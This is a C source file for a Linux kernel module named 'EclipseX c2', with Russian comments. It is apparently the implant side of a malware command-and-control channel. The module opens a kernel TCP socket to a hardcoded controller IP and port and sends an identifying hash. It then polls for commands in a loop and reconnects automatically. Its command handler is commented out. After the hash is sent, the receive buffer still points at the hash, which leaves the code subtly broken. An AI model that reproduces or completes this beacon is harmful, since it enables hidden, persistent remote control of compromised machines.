#define pr_fmt(fmt) "EclipseX c2: " fmt

#include <linux/kernel.h>

#include <linux/net.h>
#include <linux/in.h>
#include <linux/socket.h>
#include <linux/inet.h>

#include <linux/delay.h>

#include <linux/kthread.h>

#include "connection.h"
#include "commands/system_info/system_info.h"

#define SERVER_IP   "192.168.157.187"       // IP сервера
#define SERVER_PORT 3476                    // Порт сервера
#define BUFFER_SIZE 1024
#define RECONNECT_DELAY 5000                // ms
#define RECV_DELAY 5000                // ms


struct socket *conn_socket = NULL;

static void connect_to_server(void) {
    struct sockaddr_in server_addr;
    int ret;

    // Создаем TCP-сокет
    ret = sock_create_kern(&init_net, AF_INET, SOCK_STREAM, IPPROTO_TCP, &conn_socket);
    if (ret < 0) {
        pr_err("Failed to create socket\n");
        conn_socket = NULL;
        return;
    }

    // Настраиваем адрес сервера
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);
    server_addr.sin_addr.s_addr = in_aton(SERVER_IP);

    // Подключаемся
    ret = conn_socket->ops->connect(conn_socket, (struct sockaddr *)&server_addr, sizeof(server_addr), 0);
    if (ret < 0) {
        printk(KERN_ERR "Connection failed\n");
        sock_release(conn_socket);
        conn_socket = NULL;
        return;
    }

    return;
}

static int send_message(struct kvec *vec) {
    struct msghdr msg_hdr;
    int ret;

    memset(&msg_hdr, 0, sizeof(msg_hdr));

    ret = kernel_sendmsg(conn_socket, &msg_hdr, vec, 1, vec->iov_len);
    if (ret < 0) {
        pr_err("Send error: %d\n", ret);
        return ret;
    }

    return ret;
}

static void analyze_the_command(char *command) {
    struct kvec vec;
    char buffer[BUFFER_SIZE];
    vec.iov_base = buffer;
    vec.iov_len = BUFFER_SIZE - 1;
    memset(buffer, 0x00, BUFFER_SIZE);

    // switch (command[0])
    // {
    // // System info
    // case 0x00:
    //     // cpu_stat();
    //     // os_info(&vec);
    //     // send_message(&vec);
    //     break;
    
    // default:
    //     // send_message("0");
    //     break;
    // }

    return;
}

int handle_server_command(void *ex_hash) {
    struct msghdr msg_hdr;
    struct kvec vec;
    char buffer[BUFFER_SIZE];
    int ret;
    bool isSendHash = false;

    msg_hdr.msg_flags = 0;
    vec.iov_base = buffer;
    vec.iov_len = BUFFER_SIZE - 1;

    while (!kthread_should_stop()) {
        if (conn_socket) {
            if (!isSendHash) {
                pr_info("%s", (char *)ex_hash);
                vec.iov_base = (char *)ex_hash;
                vec.iov_len = strlen((char *)ex_hash);
                if (send_message(&vec) <= 0) {
                    pr_info("no send ex_hash");
                    conn_socket = NULL;
                    continue;
                }
                pr_info("send ex_hash");
                isSendHash = true;
            }
            // msleep(500); 
            ret = kernel_recvmsg(conn_socket, &msg_hdr, &vec, 1, vec.iov_len, MSG_DONTWAIT);
            // ret = kernel_recvmsg(conn_socket, &msg_hdr, &vec, 1, vec.iov_len, 0);
            pr_info("%d", ret);
            if (ret > 0) {
                buffer[ret] = '\0';
                // analyze_the_command(buffer);
                // pr_info("%s\n", buffer);
                memset(buffer, 0x00, ret);

            } else if (ret == 0) {
                pr_info("[C2] Server disconnected\n");
                sock_release(conn_socket);
                conn_socket = NULL;
            } else {
                pr_err("[C2] Receive error: %d\n", ret);
                msleep(RECV_DELAY);
                continue;
            }
            
        } else {
            msleep(RECONNECT_DELAY);
            connect_to_server();
            isSendHash = false;
        }

    }

    return 0;
}
